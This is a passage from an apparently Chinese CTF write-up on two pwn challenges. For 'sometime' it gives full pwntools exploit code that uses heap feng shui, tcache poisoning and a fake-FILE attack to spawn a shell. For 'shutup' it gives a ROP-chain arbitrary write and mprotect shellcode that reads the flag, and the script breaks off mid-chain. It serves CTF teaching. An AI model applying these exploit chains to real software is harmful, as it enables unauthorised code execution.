title=\"关于堆风水\"></a>关于堆风水</h3><p>这道一题目，我们需要尽量申请时候使用不同的size，否则将会申请出相同地址的堆块，或者这里可以多次add，使得申请多个无指针引用内存，使得内存地址扩展，之后篡改size顶部tcachebin，size位置，使得刚好大小超过0x420并能完美覆盖中间tcache，衔接上后方伪造的size，使得此时free后能进入unsortedbin，从而可以泄露main_arena地址，使得泄露libc地址。</p>\n<p>之后就是修改tcachebin的count使得大于1，这里就要一些堆风水的技巧，一种可行的思路是，我们构造一种堆叠，<strong>使得一个大的tcachebin堆块覆盖两个及其以上的堆块</strong>，这样我们就可以同时操控chunk1和chunk2的内容，控制这两个size设置为相同的即可</p>\n<p>（注意由于本题目只能拿到一个堆块做操作，也就是修改fakechunk的时候chunk1与2是在tcachebin中的，tacachebin中并不检查malloc取出的堆块大小是否正确，同时这里修改chunk2时候，注意恢复chunk1的fd和key字段）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| ---------- fake chunk -------------------|</span><br><span class=\"line\">...-| --- chunk1 --- | --- chunk2 --- | -...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>PS：由于本题做了大量的sleep操作，这里在本地调试的时候需要patch掉sleep的时间，使得调试变快</p>\n<p>在程序最后需要等待时间到达，系统自动调用exit退出即可获得shell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(b&quot;./sometime&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;note&gt; &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;exp running ...&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0xa0</span>-<span class=\"number\">0x10</span>, <span class=\"number\">0xf0</span>, <span class=\"number\">0x10</span>): </span><br><span class=\"line\">    add(i, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">    free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x30</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x5e1</span>) + <span class=\"string\">b&quot;114514&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;I can only assist up to this point. Sorry.&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">leak = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak - <span class=\"number\">0x21a10a</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base: <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>, checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x78</span>) + <span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">heap_addr = u64(io.recv(<span class=\"number\">5</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_addr: <span class=\"subst\">&#123;heap_addr:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x80</span>) + <span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">key = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;key: <span class=\"subst\">&#123;key:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x70</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x51</span>) + p64(heap_addr &gt;&gt; <span class=\"number\">12</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: heap_addr &gt;&gt; <span class=\"number\">12</span>,</span><br><span class=\"line\">    <span class=\"number\">0x88</span>: key,</span><br><span class=\"line\">    <span class=\"number\">0xc8</span>: <span class=\"number\">0x31</span></span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x78</span>: <span class=\"number\">0x31</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: heap_addr &gt;&gt; <span class=\"number\">12</span>,</span><br><span class=\"line\">    <span class=\"number\">0x88</span>: key,</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x78</span>: <span class=\"number\">0x51</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: (libc.symbols[<span class=\"string\">&quot;_IO_list_all&quot;</span>]) ^ (heap_addr &gt;&gt; <span class=\"number\">12</span>),</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">fake_file_addr = heap_addr + <span class=\"number\">0x7f0</span></span><br><span class=\"line\"><span class=\"comment\"># ref: https://blog.csome.cc/p/houseofminho-wp/</span></span><br><span class=\"line\">add(<span class=\"number\">0xe0</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>],</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: fake_file_addr-<span class=\"number\">0x10</span>, <span class=\"comment\"># wide data</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: fake_file_addr+<span class=\"number\">0x100</span>, <span class=\"comment\"># 可写，且内存为0即可</span></span><br><span class=\"line\">    <span class=\"number\">0xD0</span>: fake_file_addr+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>, <span class=\"comment\"># wide data vtable</span></span><br><span class=\"line\">    <span class=\"number\">0xD8</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable  </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, p64(fake_file_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240331204105421.png\" alt=\"image-20240331204105421\"></p>\n<p>ps: 附录中有调试使用的dockerfile与docker-compose.yml</p>\n<h2 id=\"shutup\"><a href=\"#shutup\" class=\"headerlink\" title=\"shutup\"></a>shutup</h2><p>此题没有输出，单纯只有输入，没有开PIE，没有开canary，漏洞就是栈溢出</p>\n<p><img src=\"/p/2024changchengbei/image-20240401042955524.png\" alt=\"image-20240401042955524\"></p>\n<p>但是这里难点是如何泄露，或者如何构造出libc的任意地址，很明显，这里不给我们第二次的输入机会</p>\n<p>需要注意到，题目给了一个没有调用的函数，可以从数组中取出数据，这里可以利用数组下标负数溢出，使得取出got表中read地址</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043039760.png\" alt=\"image-20240401043039760\"></p>\n<p><img src=\"/p/2024changchengbei/image-20240401043048348.png\" alt=\"image-20240401043048348\"></p>\n<p>获得了read地址还不足以能够做到取出libc任意地址，但是如果这里的<code>qword_601060 += atoi(nptr);</code>逻辑就很巧妙，如果我们能够按照下面的方法控制执行流，那么我们就能将read内容存入qword_601060中，之后我们利用rop，在bss上布置一个数字，并使用<code>pop_rdi; ret 0x000400703</code>的手法，就能在qword_601060中构造出read+offset，我们也就能获得syscall</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043318111.png\" alt=\"image-20240401043318111\"></p>\n<h3 id=\"任意地址写原语\"><a href=\"#任意地址写原语\" class=\"headerlink\" title=\"任意地址写原语\"></a>任意地址写原语</h3><p>在进入栈溢出函数的开始，我们只能写入0x40个字节，很明显，这是不够的，我们需要找到一种方法，能够任意地址写，并能支持写入多个字符。</p>\n<p>答案是：依然还是函数sub_4006B7，我们再次审视下面的函数汇编，会发现，edi的数值会写入[rbp-4]的位置，而rbp我们可以通过pop rbp的rop控制</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043048348.png\" alt=\"image-20240401043048348\"></p>\n<p>我们很轻松的就能构造如下的原语</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">    pop_rbp, <span class=\"number\">4</span> + addr,</span><br><span class=\"line\">    pop_rdi, <span class=\"number\">0xde</span>,</span><br><span class=\"line\">    <span class=\"number\">0x0004006BB</span>, rbp,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>这就能向addr中写入0xde字节，为什么我们只能写入一个字节呢？因为edi的数值后续会作为数组的索引，数字太大会导致索引到不可读的内存，导致段错误，所以为了保险起见，这里我们每次只写入1个字节</p>\n<p>最后我们就能构造任意地址写的payload构造函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">make_bytes</span>(<span class=\"params\">addr, bbb</span>):</span><br><span class=\"line\">    target = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bbb)):</span><br><span class=\"line\">        tmp = bbb[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        template = [</span><br><span class=\"line\">            pop_rbp, <span class=\"number\">4</span> + addr + i,</span><br><span class=\"line\">            pop_rdi, tmp,</span><br><span class=\"line\">            <span class=\"number\">0x0004006BB</span>, base,</span><br><span class=\"line\">        ]</span><br><span class=\"line\">        target.extend(template)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target</span><br></pre></td></tr></table></figure>\n\n<p>接下来的内容就比较简单，控制rdi、rsi、rdx之后调用mprotect修改bss的可执行权限，写入shellcode即可</p>\n<p>但是rdx的控制这里利用了，这个部分，控制r12、rbx内容使得call的内容刚好是pop rbp，将call在栈上写入的地址pop掉即可</p>\n<p><img src=\"/p/2024changchengbei/image-20240401044525680.png\" alt=\"image-20240401044525680\"></p>\n<h3 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(</span><br><span class=\"line\"><span class=\"string\">f&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">mov rax, <span class=\"subst\">&#123;u64((<span class=\"string\">b&quot;./flag&quot;</span> + <span class=\"built_in\">bytearray</span>([<span class=\"number\">0</span>]*<span class=\"number\">8</span>))[:<span class=\"number\">8</span>])&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, 0</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 3</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 0</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000400655 : call qword ptr [rbp + 0x48]</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./shutup&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_rax_libc = <span class=\"number\">0x0000400696</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004007e3</span></span><br><span class=\"line\">get_rax = <span class=\"number\">0x004006B7</span> </span><br><span class=\"line\">call_rax = <span class=\"number\">0x000000000040064e</span></span><br><span class=\"line\">call_ptr_rax = <span class=\"number\">0x00000000004008a3</span></span><br><span class=\"line\">pop_r14_r15 = <span class=\"number\">0x004007E0</span></span><br><span class=\"line\">pop_rbp = <span class=\"number\">0x00000000004005c0</span></span><br><span class=\"line\">pop_rsp_r13_r14_r15 = <span class=\"number\">0x00000000004007dd</span></span><br><span class=\"line\">pop_rbx_rbp_r12_r13_r14_r15  = <span class=\"number\">0x04007DA</span></span><br><span class=\"line\">jmp_rax = <span class=\"number\">0x00000000004005b5</span></span><br><span class=\"line\">pop_r13_r14_r15 = <span class=\"number\">0x0004007DE</span></span><br><span class=\"line\">pop_rsi_r15 = <span class=\"number\">0x00000000004007e1</span></span><br><span class=\"line\">atoi = <span class=\"number\">0x00400550</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x10</span> <span class=\"comment\"># offset 2 syscall</span></span><br><span class=\"line\">base = <span class=\"number\">0x00601380</span></span><br><span class=\"line\">io.sendline(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: base + <span class=\"number\">0x38</span>, <span class=\"comment\"># rbp</span></span><br><span class=\"line\">    <span class=\"number\">0x8</span>: pop_rdi, </span><br><span class=\"line\">    <span class=\"number\">0x10</span>: base + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x00400703</span>, <span class=\"comment\"># call atoi</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: pop_r14_r15,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"string\">b&quot;ls&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: tob(offset).rjust(<span class=\"number\">7</span>, <span class=\"string\">b&quot; &quot;</span>) + <span class=\"string\">b&quot;\\x00&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x38</span>: <span class=\"number\">0x0601060</span>-<span class=\"number\">0x48</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: tob(<span class=\"number\">0x40000</span>),</span><br><span class=\"line\">    <span class=\"number\">0xf</span>: <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">make_bytes</span>(<span class=\"params\">addr, bbb</span>):</span><br><span class=\"line\">    target = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bbb)):</span><br><span class=\"line\">        tmp = bbb[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        template = [</span><br><span class=\"line\">            pop_rbp, <span class=\"number\">4</span> + addr + i,</span><br><span class=\"line\">            pop_rdi, tmp,</span><br><span class=\"line\">            <span class=\"number\">0x0004006BB</span>, base,</span><br><span class=\"line\">        ]</span><br><span class=\"line\">        target.extend(template)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain = []</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain.extend(make_bytes(base + <span class=\"number\">0x40</span>, flat(</span><br><span class=\"line\">    [</span><br><span class=\"line\">        pop_rbx_rbp_r12_r13_r14_r15, <span class=\"number\">0</span>, <span class=\"number\">0</span>, base + <span class=\"number\">0x40</span> + <span class=\"number\">8</span> * <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4007C0</span>, <span class=\"comment\"># mov     rdx, r13</span></span><br><span class=\"line\">        pop_rbp, <span class=\"number\">0x0601060</span>,</span><br><span class=\"line\">        pop_rdi, <span class=\"number\">2</span>,</span><br><span class=\"line\">        get_rax,</span><br><span class=\"line\">        pop_rdi, base &amp; (~<span class=\"number\">0xfff</span>),</span><br><span class=\"line\">        pop_rsi_r15, <span class=\"number\">0x1000</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x000000000040094b</span>, <span class=\"comment\"># jmp ptr[rbp]</span></span><br><span class=\"line\">        base + <span class=\"number\">0xe0</span>,</span><br><span class=\"line\">        shellcode</span><br><span class=\"line\">    ], filler=<span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\">)))</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain.extend(make_bytes(<span class=\"number\">0x00601068</span>, <span class=\"string\">b&quot;7&quot;</span>))</span><br><span class=\"line\">rop_chain.extend(make_bytes(<span 